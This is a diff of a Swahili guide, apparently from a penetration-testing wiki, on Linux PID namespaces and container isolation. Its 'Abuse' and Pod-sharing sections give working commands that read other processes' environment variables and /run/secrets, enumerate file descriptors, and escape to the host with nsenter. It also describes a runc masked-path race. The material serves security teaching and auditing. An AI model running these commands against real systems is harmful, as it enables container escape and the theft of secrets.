@@ -4,60 +4,67 @@
 
 ## Muhtasari
 
-PID namespace hudhibiti jinsi processes zinavyopangiwa namba na ni processes zipi zinazoonekana. Hii ndiyo sababu container inaweza kuwa na PID 1 yake yenyewe ingawa si mashine halisi. Ndani ya namespace, workload huona kinachoonekana kuwa process tree ya ndani. Nje ya namespace, host bado huona PIDs halisi za host na mazingira kamili ya processes.<sup>[[3]](#references)</sup>
+PID namespace hudhibiti jinsi michakato inavyopangiwa nambari na ni michakato ipi inayoonekana. Ndiyo maana container inaweza kuwa na PID 1 yake hata ingawa si mashine halisi. Ndani ya namespace, workload huona kile kinachoonekana kama mti wa michakato wa ndani. Nje ya namespace, host bado huona PID halisi za host na mandhari kamili ya michakato.<sup>[[3]](#references)</sup>
 
-Kwa mtazamo wa usalama, PID namespace ni muhimu kwa sababu uwezo wa kuona processes una thamani. Workload inapoweza kuona processes za host, inaweza kuwa na uwezo wa kuchunguza majina ya services, command-line arguments, secrets zilizopitishwa kwenye process arguments, hali inayotokana na environment kupitia `/proc`, na targets zinazowezekana za kuingia kwenye namespaces. Ikiweza kufanya zaidi ya kuona processes hizo pekee, kwa mfano kutuma signals au kutumia ptrace chini ya masharti yanayofaa, tatizo huwa kubwa zaidi.
+Kwa mtazamo wa usalama, PID namespace ni muhimu kwa sababu mwonekano wa michakato una thamani. Workload inapoweza kuona michakato ya host, inaweza kuweza kuona majina ya huduma, hoja za command line, siri zilizopitishwa kwenye hoja za michakato, hali inayotokana na mazingira kupitia `/proc`, na michakato inayoweza kulengwa kwa kuingia kwenye namespace. Ikiwa inaweza kufanya zaidi ya kuona tu michakato hiyo, kwa mfano kutuma signals au kutumia ptrace chini ya masharti yanayofaa, tatizo huwa kubwa zaidi.
 
 ## Uendeshaji
 
-PID namespace mpya huanza ikiwa na mfumo wake wa ndani wa kupanga namba za processes. Process ya kwanza inayoundwa ndani yake huwa PID 1 kwa mtazamo wa namespace hiyo, jambo ambalo pia humaanisha kwamba hupata semantics maalum zinazofanana na init kwa children waliokuwa yatima na tabia ya signals. Hii inaeleza mambo mengi yasiyo ya kawaida ya containers kuhusu init processes, ukusanyaji wa zombie processes, na kwa nini wrappers ndogo za init hutumiwa wakati mwingine kwenye containers.<sup>[[3]](#references)</sup>
+PID namespace mpya huanza na mpangilio wake wa ndani wa nambari za michakato. Mchakato wa kwanza unaoundwa ndani yake huwa PID 1 kwa mtazamo wa namespace hiyo, jambo linalomaanisha pia kwamba hupata semantiki maalum za aina ya init kwa watoto yatima na tabia ya signals. Hii hufafanua mambo mengi yasiyo ya kawaida katika container kuhusu michakato ya init, ukusanyaji wa zombie, na kwa nini wakati mwingine wrappers ndogo za init hutumiwa kwenye container.<sup>[[3]](#references)</sup>
 
-PID namespaces huunda hierarchy. Process katika ancestor namespace inaweza kushughulikia descendants kwa kutumia PID iliyopewa katika ancestor hiyo, lakini descendant haiwezi kushughulikia tasks zilizo kwenye ancestor pekee kupitia syscalls za kawaida zinazotegemea PID au `setns()` kwenda juu kwenye ancestor PID namespace. procfs inayomilikiwa na ancestor na kufichuliwa kwa descendant bado inaweza ku-leak mtazamo wa processes wa ancestor. Pia, kujiunga na PID namespace kwa `setns()` hubadilisha namespace kwa **children wa baadaye**, si caller yenyewe; kwa hiyo tools hufanya fork baada ya kujiunga. Mount ya procfs huhifadhi mtazamo wa PID wa process iliyoifanya mount, ndiyo sababu kuunda procfs mpya baada ya `unshare(CLONE_NEWPID)` ni muhimu kwa usalama na si suala la mwonekano pekee.<sup>[[3]](#references)</sup>
+PID namespaces hupangwa kwa ngazi. Mchakato katika namespace ya mzazi unaweza kufikia michakato ya namespace za vizazi kwa kutumia PID iliyopewa katika namespace hiyo ya mzazi, lakini mchakato wa namespace ya kizazi hauwezi kufikia michakato ya mzazi pekee kupitia syscalls za kawaida zinazotumia PID au kuingia kwenye PID namespace ya mzazi kwa kutumia `setns()`. procfs inayomilikiwa na mzazi na kufichuliwa kimakusudi kwa namespace ya kizazi bado inaweza kuvuja mwonekano wa michakato ya mzazi. Pia, kujiunga na PID namespace kwa kutumia `setns()` hubadilisha namespace kwa **watoto wa baadaye**, si kwa mchakato wenyewe; kwa hiyo zana huunda fork baada ya kujiunga. Mount ya procfs huhifadhi mwonekano wa PID wa mchakato ulioi-mount, ndiyo maana kuunda procfs mpya baada ya `unshare(CLONE_NEWPID)` ni muhimu kwa usalama, si kwa mwonekano tu.<sup>[[3]](#references)</sup>
 
-Somo muhimu la usalama ni kwamba process inaweza kuonekana kuwa imetengwa kwa sababu huona PID tree yake pekee, lakini utengaji huo unaweza kuondolewa kwa makusudi. Docker hufichua hili kupitia `--pid=host`, huku Kubernetes ikifanya hivyo kupitia `hostPID: true`. Container inapojiunga na host PID namespace, workload huona processes za host moja kwa moja, na attack paths nyingi zinazofuata huwa halisi zaidi.
+Somo muhimu la usalama ni kwamba mchakato unaweza kuonekana umetengwa kwa sababu unaona mti wake wa PID pekee, lakini utengaji huo unaweza kuondolewa kimakusudi. Docker hutoa kipengele hiki kupitia `--pid=host`, ilhali Kubernetes hufanya hivyo kupitia `hostPID: true`. Container inapojiunga na PID namespace ya host, workload huona michakato ya host moja kwa moja, na njia nyingi za mashambulizi zinazofuata huwa za uwezekano mkubwa zaidi.
 
 ## Maabara
 
-Kuunda PID namespace manually:
+Kuunda PID namespace mwenyewe:
+
 ```bash
 sudo unshare --pid --fork --mount-proc bash
 ps -ef
 echo $$
 ```
-Shell sasa inaona mwonekano wa faragha wa processes. Flag ya `--mount-proc` ni muhimu kwa sababu ina-mount instance ya procfs inayolingana na PID namespace mpya, hivyo orodha ya processes huwa thabiti inapokuwa ndani.<sup>[[3]](#references)</sup>
 
-Kwa kulinganisha tabia ya container:
+Shell sasa inaona mwonekano wa faragha wa michakato. Alama ya `--mount-proc` ni muhimu kwa sababu huweka instance ya procfs inayolingana na PID namespace mpya, na kufanya orodha ya michakato iwe na mshikamano kutoka ndani.<sup>[[3]](#references)</sup>
+
+Ili kulinganisha tabia ya container:
+
 ```bash
 docker run --rm debian:stable-slim ps -ef
 docker run --rm --pid=host debian:stable-slim ps -ef | head
 ```
-Tofauti hiyo inaonekana mara moja na ni rahisi kuelewa, ndiyo maana hii ni labu nzuri ya kwanza kwa wasomaji.
 
-## Matumizi ya Runtime
+Tofauti inaonekana mara moja na ni rahisi kuelewa, ndiyo maana hili ni jaribio la kwanza zuri kwa wasomaji.
 
-Containers za kawaida katika Docker, Podman, containerd, na CRI-O hupata PID namespace yao wenyewe. Containers za Kubernetes kwa kawaida huwa na mionekano tofauti ya PID; `shareProcessNamespace: true` huunda kwa makusudi mwonekano mmoja wa Pod nzima.<sup>[[4]](#references)</sup> Kinyume chake, `hostPID: true` huchagua PID namespace ya node. Mazingira ya LXC/Incus hutegemea kernel primitive hiyo hiyo, ingawa matumizi ya system-container yanaweza kuonyesha process trees zilizo changamano zaidi na kuhimiza debugging shortcuts zaidi.
+## Matumizi wakati wa Runtime
 
-Kanuni hiyo hiyo inatumika kila mahali: ikiwa runtime ilichagua kutotenga PID namespace, huo ni upunguzaji wa makusudi wa mpaka wa container.
+Containers za kawaida katika Docker, Podman, containerd, na CRI-O hupata PID namespace yao wenyewe. Containers za Kubernetes kwa kawaida huwa na mwonekano tofauti wa PID; `shareProcessNamespace: true` huunda kimakusudi mwonekano mmoja wa Pod nzima.<sup>[[4]](#references)</sup> Kinyume chake, `hostPID: true` huchagua PID namespace ya node. Mazingira ya LXC/Incus hutegemea primitive ileile ya kernel, ingawa matumizi ya system-container yanaweza kufichua miti changamano zaidi ya process na kuhimiza njia za mkato zaidi za debugging.
 
-## Misconfigurations
+Kanuni hiyo hiyo inatumika kila mahali: ikiwa runtime iliamua kutenga PID namespace, basi hilo ni punguzo la kimakusudi la mipaka ya container.
 
-Misconfiguration ya kawaida ni kushiriki host PID. Timu mara nyingi huhalalisha hili kwa debugging, monitoring, au urahisi wa service-management, lakini linapaswa kila wakati kuchukuliwa kama security exception yenye maana. Hata kama container haina write primitive ya moja kwa moja juu ya host processes, mwonekano pekee unaweza kufichua mengi kuhusu mfumo. Mara tu capabilities kama `CAP_SYS_PTRACE` au procfs access yenye manufaa zinapoongezwa, hatari huongezeka kwa kiasi kikubwa.
+## Mipangilio isiyo sahihi
 
-Kosa jingine ni kudhani kwamba kwa sababu workload haiwezi kwa default kuua au kufanya ptrace kwenye host processes, basi kushiriki host PID hakuna madhara. Hitimisho hilo linapuuza thamani ya enumeration, upatikanaji wa namespace-entry targets, na jinsi PID visibility inavyoungana na controls nyingine zilizodhoofishwa.
+Mipangilio isiyo sahihi inayojulikana zaidi ni kushiriki PID za host. Timu mara nyingi huhalalisha hili kwa urahisi wa debugging, monitoring, au usimamizi wa huduma, lakini linapaswa kuchukuliwa kila wakati kama hali ya kiusalama isiyo ya kawaida yenye athari kubwa. Hata kama container haina njia ya moja kwa moja ya kuandika kwenye processes za host, mwonekano pekee unaweza kufichua mengi kuhusu mfumo. Mara tu capabilities kama `CAP_SYS_PTRACE` au ufikiaji muhimu wa procfs zinapoongezwa, hatari huongezeka sana.
 
-### Kubernetes Pod-wide process sharing
+Kosa jingine ni kudhani kwamba kwa sababu workload haiwezi kuua au kutumia ptrace kwenye processes za host kwa chaguomsingi, basi kushiriki PID za host hakuna madhara. Hitimisho hilo linapuuza thamani ya uchunguzi wa mifumo, upatikanaji wa targets za kuingia kwenye namespace, na jinsi mwonekano wa PID unavyoungana na vidhibiti vingine vilivyodhoofishwa.
 
-`shareProcessNamespace: true` ni tofauti na `hostPID`: hufichua processes za **containers nyingine zilizo katika Pod hiyo hiyo**, si node processes. Sidecar au debug container iliyo-compromise inaweza kisha ku-enumerate sibling command lines na environment data kulingana na procfs access checks, kutuma signals pale credentials zinaporuhusu, na kupitia filesystem ya sibling kupitia `/proc/<pid>/root`. Kubernetes inaonya wazi kwamba command-line/environment secrets na container filesystems hulindwa tu na Unix permissions zinazotumika.<sup>[[4]](#references)</sup>
+### Kushiriki processes katika Pod nzima ya Kubernetes
+
+`shareProcessNamespace: true` ni tofauti na `hostPID`: hufichua processes za **containers nyingine zilizo katika Pod hiyo hiyo**, si processes za node. Kisha sidecar au debug container iliyoathiriwa inaweza kuchunguza command lines na data ya mazingira ya containers jirani kwa kuzingatia ukaguzi wa ufikiaji wa procfs, kutuma signals wakati credentials zinaruhusu, na kupitia filesystem ya container jirani kupitia `/proc/<pid>/root`. Kubernetes inaonya wazi kwamba siri zilizo kwenye command line/environment na filesystem za containers hulindwa tu na ruhusa husika za Unix.<sup>[[4]](#references)</sup>
 
 Ukaguzi muhimu upande wa cluster:
+
 ```bash
 kubectl get pods -A -o json | jq -r '
-.items[] |
-select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
-[.metadata.namespace,.metadata.name,
-(.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
+  .items[] |
+  select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
+  [.metadata.namespace,.metadata.name,
+   (.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
 ```
-Kutoka kwenye container iliyoathiriwa katika Pod-wide PID namespace, kwanza jaribu ufikiaji halisi badala ya kudhani kwamba visibility ni sawa na readability:<sup>[[4]](#references)</sup>
+
+Kutoka kwenye kontena lililoathiriwa katika Pod-wide PID namespace, kwanza jaribu ufikiaji halisi badala ya kudhani kwamba kuonekana kunamaanisha kusomeka:<sup>[[4]](#references)</sup>
+
 ```bash
 victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
 [ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
@@ -65,84 +72,123 @@ tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
 tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
 find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
 ```
-## Matumizi Mabaya
 
-Ikiwa host PID namespace imeshirikiwa, attacker anaweza kukagua process za host, kukusanya process arguments, kutambua services zinazovutia, kupata PIDs zinazoweza kutumiwa na `nsenter`, au kuchanganya mwonekano wa process na privilege inayohusiana na ptrace ili kuingilia workloads za host au workloads zilizo jirani. Katika baadhi ya hali, kuona tu process sahihi inayotumika kwa muda mrefu kunatosha kubadili mpango uliobaki wa attack.
+### Kontena za muda mfupi zilizolengwa katika Pod iliyopo ya Kubernetes
 
-Hatua ya kwanza ya vitendo huwa kuthibitisha kwamba process za host zinaonekana kweli:
+Utambulisho wa Kubernetes unaoruhusiwa kurekebisha `pods/ephemeralcontainers` unaweza kuongeza debugger kwenye Pod inayoendeshwa hata kama `shareProcessNamespace` haijawekwa. Kwa kutumia `--target`, debugger hujiunga na process namespace ya kontena lililotajwa ikiwa runtime inaunga mkono ulengaji wa namespace. Hii huonyesha michakato ya kontena hilo, si namespace ya PID ya host ya node.<sup>[[5]](#references)</sup>
+
+API hutumia subresource tofauti, kwa hivyo kagua ruhusa zake za `patch`/`update` badala ya kudhani kuwa ruhusa za kawaida za kuandika Pod zinajumuisha hizo.<sup>[[6]](#references)</sup>
+
+Kwa Pod na kontena ndani ya namespace iliyoidhinishwa, jaribu mwonekano unaolengwa:<sup>[[5]](#references)[[6]](#references)</sup>
+
+```bash
+ns=default; pod=myapp; container=app
+kubectl auth can-i get pods -n "$ns"
+kubectl auth can-i patch pods/ephemeralcontainers -n "$ns"
+kubectl auth can-i update pods/ephemeralcontainers -n "$ns"
+kubectl auth can-i create pods/attach -n "$ns"
+kubectl -n "$ns" debug -it "pod/$pod" --image=busybox:1.36 --target="$container" -- sh
+# In the debug shell: verify the target processes are actually visible.
+ps -ef
+```
+
+Ikiwa runtime haitumii targeting, debugger inaweza kushindwa kuanza au kubaki kwenye PID namespace iliyotengwa.<sup>[[5]](#references)</sup> Ikiwa targeting inafanya kazi, tumia ukaguzi ulio chini ya [Kubernetes Pod-wide process sharing](#kubernetes-pod-wide-process-sharing) ili kujaribu ufikiaji wa `/proc/<pid>`. Kuona mchakato hakumaanishi una ruhusa ya kusoma siri za target au kuitumia signal: Unix credentials na ukaguzi wa ufikiaji wa procfs bado hutumika.<sup>[[4]](#references)[[8]](#references)</sup> Pod Security Standards pia huweka vikwazo kwa mipangilio yenye upendeleo kwenye ephemeral containers.<sup>[[7]](#references)</sup>
+
+## Abuse
+
+Ikiwa host PID namespace inashirikiwa, mshambuliaji anaweza kukagua michakato ya host, kukusanya hoja za michakato, kutambua huduma zinazovutia, kupata PIDs zinazoweza kutumika kwa `nsenter`, au kuchanganya uwezo wa kuona michakato na mamlaka yanayohusiana na ptrace ili kuingilia shughuli za host au workloads jirani. Katika baadhi ya hali, kuona tu mchakato sahihi unaoendelea kwa muda mrefu kunatosha kubadili mpango mzima wa shambulio.
+
+Hatua ya kwanza ya vitendo ni kuthibitisha kila wakati kwamba michakato ya host inaonekana kweli:
+
 ```bash
 readlink /proc/self/ns/pid
 ps -ef | head -n 50
 ls /proc | grep '^[0-9]' | head -n 20
 ```
-Mara PIDs za host zinapoonekana, arguments za process na targets za namespace-entry mara nyingi huwa chanzo muhimu zaidi cha taarifa:
+
+Mara tu PIDs za host zinapoonekana, argument za process na targets za kuingia kwenye namespace mara nyingi huwa vyanzo muhimu zaidi vya taarifa:
+
 ```bash
 for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
-echo "PID=$p"
-tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
+  echo "PID=$p"
+  tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
 done
 ```
-Ikiwa `nsenter` inapatikana na privileges za kutosha zipo, jaribu kubaini ikiwa process inayoonekana ya host inaweza kutumika kama namespace bridge:
+
+Ikiwa `nsenter` inapatikana na kuna ruhusa za kutosha, jaribu ikiwa mchakato wa host unaoonekana unaweza kutumika kama daraja la namespace:
+
 ```bash
 which nsenter
 nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
 ```
-Hata kuingia kunapozuiwa, kushiriki PID za host tayari kuna thamani kwa sababu hufichua mpangilio wa huduma, vipengele vya runtime, na michakato yenye privileges inayoweza kulengwa baadaye. Kuonekana kwa PID pekee **hakutoi** ruhusa ya kutuma signal, kufanya trace, kusoma entries nyeti za `/proc/<pid>`, au kujiunga na namespaces nyingine za target; credentials, dumpability, capabilities katika user namespace inayomiliki target namespace, sera ya Yama/LSM, na seccomp bado ni muhimu.<sup>[[3]](#references)</sup> Tazama [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) kwa mifano ya process-injection.
 
-Kuonekana kwa PID za host pia hufanya abuse ya file descriptor kuwa halisi zaidi. Ikiwa process yenye privileges ya host au workload jirani ina file au socket nyeti iliyofunguliwa, attacker anaweza kuweza kukagua `/proc/<pid>/fd/` na kufikia object ya msingi, kutegemea checks za ptrace-style, ownership, mount options za procfs, aina ya object, na service model ya target. Kuona symlink ya FD pekee hakumaanishi kwamba inaweza kufunguliwa, na socket haiwezi kunakiliwa kwa kufungua tu symlink yake ya `/proc/<pid>/fd/N`. Kwa primitive tofauti ya `pidfd_getfd()` na authorization checks zake, tazama [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md).<sup>[[3]](#references)</sup>
+Hata kuingia kukizuiwa, kushiriki PID za host tayari kuna manufaa kwa sababu hufichua mpangilio wa huduma, vipengele vya runtime, na michakato inayoweza kuwa na privileged ambayo inaweza kulengwa baadaye. Kuona PID pekee **hak**ukupi ruhusa ya kutuma signal, kufuatilia, kusoma maingizo nyeti ya `/proc/<pid>`, au kujiunga na namespaces nyingine za target; credentials, dumpability, capabilities katika user namespace inayomiliki namespace ya target, sera za Yama/LSM, na seccomp bado ni muhimu.<sup>[[3]](#references)</sup> Tazama [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) kwa mifano ya process-injection.
+
+Kuona PID za host pia hufanya matumizi mabaya ya file descriptor yawezekane zaidi. Ikiwa process yenye privileged ya host au workload iliyo jirani ina faili nyeti au socket iliyofunguliwa, mshambuliaji anaweza kuweza kukagua `/proc/<pid>/fd/` na kufikia object husika, kutegemea ukaguzi wa aina ya ptrace, umiliki, chaguo za mount za procfs, aina ya object, na muundo wa huduma lengwa. Kuona symlink ya FD pekee hakumaanishi kuwa inaweza kufunguliwa, na socket haiwezi kunakiliwa kwa kufungua tu symlink yake ya `/proc/<pid>/fd/N`. Kwa primitive tofauti ya `pidfd_getfd()` na ukaguzi wake wa uidhinishaji, tazama [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md).<sup>[[3]](#references)</sup>
+
 ```bash
 for fd_dir in /proc/[0-9]*/fd; do
-ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
+  ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
 done
 grep " /proc " /proc/mounts
 ```
-Amri hizi ni muhimu kwa sababu zinajibu ikiwa `hidepid=1` au `hidepid=2` inapunguza mwonekano kati ya process na nyingine, na ikiwa descriptors zinazoonekana kuwa za kuvutia, kama vile secret files zilizo wazi, logs, au Unix sockets, zinaonekana kabisa.
+
+Amri hizi ni muhimu kwa sababu zinaonyesha ikiwa `hidepid=1` au `hidepid=2` inapunguza mwonekano kati ya michakato na ikiwa descriptors zinazoonekana kuwa za kuvutia, kama vile faili za siri zilizo wazi, logi au Unix sockets, zinaonekana kabisa.
 
 ### Mfano Kamili: host PID + `nsenter`
 
-Kushiriki host PID huwa host escape ya moja kwa moja wakati process pia ina privilege ya kutosha ya kujiunga na host namespaces:
+Kushiriki PID ya host kunaweza kuwezesha host escape ikiwa mchakato una capabilities zinazohitajika kujiunga na namespaces za host na kutumia root ya mchakato wa host. `nsenter --root` (`-r`) inahitajika kwa hilo: kubadilisha mount namespace pekee hakubadilishi saraka ya root ya caller.<sup>[[9]](#references)</sup> Kufikia `/proc/1/root` kunahitaji kupita ukaguzi wa ptrace wa kusoma, huku kubadilisha root kukihitaji `CAP_SYS_CHROOT` katika user namespace ya caller.<sup>[[8]](#references)[[10]](#references)</sup>
+
 ```bash
 ps -ef | head -n 50
-capsh --print | grep cap_sys_admin
-nsenter -t 1 -m -u -n -i -p /bin/bash
+capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
+nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh
 ```
-Ikiwa command itafaulu, container process sasa inatekelezwa katika mount, UTS, network, IPC, na PID namespaces za host. Athari yake ni kucompromise host mara moja.
 
-Hata wakati `nsenter` yenyewe haipo, matokeo hayo hayo yanaweza kupatikana kupitia binary ya host ikiwa filesystem ya host ime-mountiwa:
+Ikiwa amri itafaulu, shell mpya itatumia namespaces za mount, UTS, network, IPC na PID za host pamoja na mfumo wa faili wa root wa PID 1. Kagua utambulisho na ruhusa zinazotumika badala ya kudhani kuwa kuona PID pekee kumekupa mamlaka ya host.<sup>[[9]](#references)</sup>
+
+Hata kama `nsenter` yenyewe haipo, huenda matokeo hayo hayo yakapatikana kupitia binary ya host ikiwa mfumo wa faili wa host umewekwa mount:
+
 ```bash
-/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
+/host/usr/bin/nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh 2>/dev/null
 ```
-### Maelezo ya Hivi Karibuni ya Runtime
 
-Baadhi ya mashambulizi yanayohusiana na PID namespace si `hostPID: true` misconfigurations za kawaida, bali ni bugs za utekelezaji wa runtime zinazohusu jinsi protections za procfs zinavyotumika wakati wa usanidi wa container.
+### Vidokezo vya Hivi Karibuni vya Runtime
 
-#### Race ya `maskedPaths` kuelekea host procfs
+Baadhi ya mashambulizi yanayohusiana na PID namespace si usanidi mbaya wa jadi wa `hostPID: true`, bali ni hitilafu za utekelezaji wa runtime kuhusu jinsi ulinzi wa procfs unavyotumika wakati wa kusanidi kontena.
 
-Katika matoleo yenye udhaifu ya `runc`, attackers wanaoweza kudhibiti container image au workload ya `runc exec` wanaweza kufanya race kwenye awamu ya masking kwa kubadilisha `/dev/null` iliyo upande wa container na kuwa symlink inayoelekeza kwenye procfs path nyeti kama `/proc/sys/kernel/core_pattern`. Ikiwa race hiyo ingefaulu, masked-path bind mount inaweza kuwekwa kwenye target isiyo sahihi na kufichua procfs knobs za host-global kwa container mpya.<sup>[[1]](#references)</sup>
+#### `maskedPaths` race hadi host procfs
 
-Amri muhimu ya review:
+Katika matoleo ya `runc` yaliyo hatarini, washambuliaji wanaoweza kudhibiti image ya kontena au workload ya `runc exec` wanaweza kutumia race wakati wa hatua ya masking kwa kubadilisha `/dev/null` iliyo upande wa kontena kuwa symlink inayoelekeza kwenye njia nyeti ya procfs, kama vile `/proc/sys/kernel/core_pattern`. Race ikifaulu, bind mount ya masked-path inaweza kuwekwa kwenye lengo lisilo sahihi na kufichua vidhibiti vya procfs vya host-global kwa kontena jipya.<sup>[[1]](#references)</sup>
+
+Amri muhimu ya ukaguzi:
+
 ```bash
 jq '.linux.maskedPaths' config.json 2>/dev/null
 ```
-Hili ni muhimu kwa sababu athari ya mwisho inaweza kuwa sawa na kufichuliwa moja kwa moja kwa procfs: `core_pattern` au `sysrq-trigger` inayoweza kuandikwa, ikifuatiwa na utekelezaji wa code kwenye host au denial of service. Kurasa maalum za [masked paths](../masked-paths.md) na [sensitive host mounts](../../sensitive-host-mounts.md) zinaeleza attack surface ya jumla ya procfs bila kuirudia hapa.
 
-#### Namespace injection na `insject`
+Hili ni muhimu kwa sababu athari ya mwisho inaweza kuwa sawa na kufichuliwa moja kwa moja kwa procfs: `core_pattern` au `sysrq-trigger` inayoweza kuandikwa, kisha utekelezaji wa msimbo kwenye host au kunyimwa huduma. Kurasa maalum za [masked paths](../masked-paths.md) na [sensitive host mounts](../../sensitive-host-mounts.md) zinaeleza eneo la jumla la mashambulizi ya procfs bila kurudia maelezo hapa.
 
-Zana za Namespace injection kama vile `insject` zinaonyesha kuwa mwingiliano na PID-namespace hauhitaji kila mara kuingia kwanza kwenye namespace lengwa kabla ya kuunda process. Msaidizi anaweza kujiambatisha baadaye, kutumia `setns()`, na kutekeleza huku akihifadhi uwezo wa kuona PID space lengwa:<sup>[[2]](#references)</sup>
+#### Uingizaji wa namespace kwa kutumia `insject`
+
+Zana za kuingiza kwenye namespace kama vile `insject` zinaonyesha kuwa mwingiliano na PID namespace hauhitaji kila mara kuingia kwenye namespace lengwa kabla ya kuunda mchakato. Msaidizi anaweza kujiunga baadaye, kutumia `setns()`, na kutekeleza huku akidumisha uwezo wa kuona nafasi ya PID lengwa:<sup>[[2]](#references)</sup>
+
 ```bash
 sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
 ```
-Aina hii ya technique ni muhimu hasa kwa advanced debugging, offensive tooling, na post-exploitation workflows ambapo namespace context lazima iunganishwe baada ya runtime kuanzisha workload.
 
-### Mifumo Husika ya Matumizi Mabaya ya FD
+Aina hii ya mbinu ni muhimu hasa katika utatuzi wa hitilafu wa hali ya juu, zana za offensive, na workflows za post-exploitation, ambapo muktadha wa namespace lazima uunganishwe baada ya runtime kuwa tayari imeanzisha workload.
 
-Mifumo miwili inafaa kutajwa wazi wakati host PIDs zinaonekana. Kwanza, privileged process inaweza kuweka sensitive file descriptor ikiwa wazi wakati wa `execve()` kwa sababu haikuwekewa `O_CLOEXEC`. Pili, services zinaweza kutuma file descriptors kupitia Unix sockets kwa kutumia `SCM_RIGHTS`. Katika hali zote mbili, kitu cha kuvutia si pathname tena, bali ni handle ambayo tayari iko wazi na ambayo lower-privilege process inaweza kurithi au kupokea.
+### Miundo Husika ya Matumizi Mabaya ya FD
 
-Hili ni muhimu katika container work kwa sababu handle inaweza kuelekeza kwenye `docker.sock`, privileged log, host secret file, au object nyingine yenye thamani kubwa, hata wakati path yenyewe haipatikani moja kwa moja kutoka kwenye container filesystem.
+Miundo miwili inafaa kutajwa waziwazi wakati PIDs za host zinaonekana. Kwanza, mchakato wenye ruhusa za juu unaweza kuacha file descriptor nyeti ikiwa wazi wakati wa `execve()` kwa sababu haikuwekewa alama ya `O_CLOEXEC`. Pili, huduma zinaweza kupitisha file descriptors kupitia Unix sockets kwa kutumia `SCM_RIGHTS`. Katika hali zote mbili, kitu muhimu si tena pathname, bali ni handle ambayo tayari imefunguliwa na ambayo mchakato wenye ruhusa za chini unaweza kurithi au kupokea.
+
+Hili ni muhimu katika kazi za container kwa sababu handle inaweza kuelekeza kwenye `docker.sock`, logi yenye ruhusa za juu, faili ya siri ya host, au kitu kingine chenye thamani kubwa, hata kama njia ya faili yenyewe haifikiwi moja kwa moja kutoka kwenye filesystem ya container.
 
 ## Ukaguzi
 
-Madhumuni ya commands hizi ni kubaini ikiwa process ina private PID view au ikiwa tayari inaweza kuorodhesha process landscape pana zaidi.
+Madhumuni ya amri hizi ni kubaini ikiwa mchakato una mwonekano binafsi wa PID au ikiwa tayari unaweza kuorodhesha mandhari pana zaidi ya michakato.
+
 ```bash
 readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
 grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
@@ -151,22 +197,31 @@ findmnt -no TARGET,FSTYPE,OPTIONS /proc
 cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
 capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
 ```
-Ni nini cha kuvutia hapa:<sup>[[3]](#references)</sup>
 
-- Ikiwa process list ina host services zinazoonekana wazi, host PID sharing huenda tayari iko enabled.
-- Kuona tree ndogo ya container-local pekee ndiyo baseline ya kawaida; kuona `systemd`, `dockerd`, au daemons zisizohusiana si kawaida.
-- `NSpid` inaweza kufichua PID mapping katika nested namespaces. Thamani iliyo kushoto kabisa inahusiana na PID namespace inayohusishwa na procfs mount, ikifuatiwa na thamani za namespaces zilizowekwa ndani yake kwa mfuatano.
-- `readlink /proc/self/ns/pid` peke yake haiwezi kuthibitisha `hostPID`: container iliyotengwa pia ina PID-namespace inode halali. Linganisha na process list, procfs mount, runtime configuration, na namespace inode ya upande wa host inapopatikana.
-- Host PIDs zinapoonekana, hata taarifa za process zilizo read-only huwa muhimu kwa reconnaissance.
+Ni nini kinachovutia hapa:<sup>[[3]](#references)</sup>
 
-Ukigundua container inayotumia host PID sharing, usichukulie hili kama tofauti ya mwonekano tu. Ni mabadiliko makubwa katika kile workload inaweza kuona na huenda ikaathiri.
+- Ikiwa orodha ya michakato ina huduma za host zinazoonekana wazi, huenda ushirikishaji wa PID za host tayari umewezeshwa.
+- Kuona tu mti mdogo wa ndani ya container ndiyo hali ya kawaida; kuona `systemd`, `dockerd`, au daemon zisizohusiana si kawaida.
+- `NSpid` inaweza kufichua ulinganifu wa PID katika namespaces zilizopachikwa. Thamani iliyo kushoto kabisa inahusiana na PID namespace iliyohusishwa na mount ya procfs, ikifuatiwa na thamani za namespaces zinazopachikwa mfululizo.
+- `readlink /proc/self/ns/pid` peke yake haiwezi kuthibitisha `hostPID`: container iliyotengwa pia ina inode halali ya PID namespace. Linganisha na orodha ya michakato, mount ya procfs, usanidi wa runtime, na inode ya namespace upande wa host inapopatikana.
+- Mara tu PID za host zinapoonekana, hata taarifa za michakato za kusoma tu huwa muhimu kwa reconnaissance.
+
+Ukigundua container inayoendesha kwa kushiriki PID za host, usichukulie hili kama tofauti ya mwonekano tu. Hili ni badiliko kubwa katika kile ambacho workload inaweza kuona na huenda kikaathiri.
+
+
 
 
 
 ## References
 
